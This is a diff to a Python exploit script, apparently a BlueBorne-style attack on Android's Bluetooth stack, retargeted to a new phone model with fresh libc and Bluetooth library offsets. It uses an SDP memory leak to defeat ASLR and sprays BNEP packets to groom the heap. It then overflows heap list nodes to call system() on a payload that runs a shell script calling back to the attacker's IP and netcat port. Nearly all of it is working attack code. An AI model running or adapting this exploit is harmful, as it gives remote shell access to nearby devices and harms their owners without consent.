@@ -29,13 +29,19 @@ STDIN_PORT = 1235
 # For my OnePlus
 #libc_elf = ELF('./libc.so')
 
-LIBC_TEXT_STSTEM_OFFSET = 0x46b4c + 1 # system + 1
-#LIBC_TEXT_STSTEM_OFFSET = libc_elf.symbols['system'] + 1
-LIBC_SOME_BLX_OFFSET = 0x2a6f77
+# LIBC_TEXT_STSTEM_OFFSET = 0x46b4c + 1 # system + 1
+# #LIBC_TEXT_STSTEM_OFFSET = libc_elf.symbols['system'] + 1
+# LIBC_SOME_BLX_OFFSET = 0x2a6f77
 
-BSS_ACL_REMOTE_NAME_OFFSET = 0x23CE48  #extract from ida, find in bss. btm_cb
-BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xfd81d
+# BSS_ACL_REMOTE_NAME_OFFSET = 0x23CE48  #extract from ida, find in bss. btm_cb
+# BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xfd81d
 
+#p10
+
+LIBC_TEXT_STSTEM_OFFSET = 0x467b0 + 1 # system + 1
+LIBC_SOME_BLX_OFFSET = 454233
+BSS_ACL_REMOTE_NAME_OFFSET = 0x228c2c
+BLUETOOTH_BSS_SOME_VAR_OFFSET = 1494752
 # For Nexus 5X 7.1.2 patch level Aug/July 2017
 #LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
 #LIBC_SOME_BLX_OFFSET = 0x1a420 + 1
@@ -97,10 +103,15 @@ def memory_leak_get_bases(src, src_hci, dst):
 
     # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
     result = bluedroid.do_sdp_info_leak(dst, src)
-
+    print result
     # Calculate according to known libc.so and bluetooth.default.so binaries
+
+    #OnePlus
     likely_some_libc_blx_offset = result[2][5]
     likely_some_bluetooth_default_global_var_offset = result[3][3]
+    #P10
+    likely_some_libc_blx_offset = result[9][7]
+    likely_some_bluetooth_default_global_var_offset = result[5][3]
 
     libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET
     bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET
@@ -123,19 +134,19 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
     # 'sysm' is the address of system() from libc. The *whole* payload is a shell script.
     # 0x1700 == (0x1722 & 0xff00) is the "event" of a "HORRIBLE_HACK" message.
 
-    # payload = struct.pack('<III', 0xAAAA1722, 0x42424242, system_addr) + b'";\n' + \
-    #                       SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
+    payload = struct.pack('<III', 0xAAAA1722, 0x42424242, system_addr) + b'";\n' + \
+                          SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
     system_addr_addr = acl_name_addr + 12 - 28
     shellcode_addr = acl_name_addr + 16
-    payload = p32(shellcode_addr) + p32(acl_name_addr) + p32(system_addr_addr) + p32(system_addr) + \
-                          SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
-
-    assert len(payload) < MAX_BT_NAME
-    assert b'\x00' not in payload
+    
+    #payload = p32(shellcode_addr) + p32(acl_name_addr) + p32(system_addr_addr) + p32(system_addr) + \
+    #                      SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
+    print payload
+    #assert len(payload) < MAX_BT_NAME
+    #assert b'\x00' not in payload
 
     # Puts payload into a known bss location (once we create a BNEP connection).
     set_bt_name(payload, src_hci, src, dst)
-
     prog = log.progress('Connecting to BNEP again')
     bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
     bnep.bind((src, 0))
@@ -143,14 +154,12 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
 
     prog.success()
     prog = log.progress('Pwning...')
-
     # Each of these messages causes BNEP code to send 100 "command not understood" responses.
     # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
     # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
     # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
-    for i in range(50):
+    for i in range(100):
         bnep.send(binascii.unhexlify('8109' + '800109' * 100))
-
     # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
     # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
     # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
@@ -161,8 +170,7 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
         _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
         if not writeable:
             break
-        bnep.send(binascii.unhexlify('810100') +
-                  struct.pack('<II', 0, acl_name_addr))
+        bnep.send(binascii.unhexlify('810100')  + p32(acl_name_addr) + p32(acl_name_addr)) 
     else:
         log.info("Looks like it didn't crash. Possibly worked")
 
@@ -192,7 +200,7 @@ def main(src_hci, dst, my_ip):
 
         system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
         acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
-        assert acl_name_addr % 4 == 0
+        #assert acl_name_addr % 4 == 0
         log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))
 
         pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)
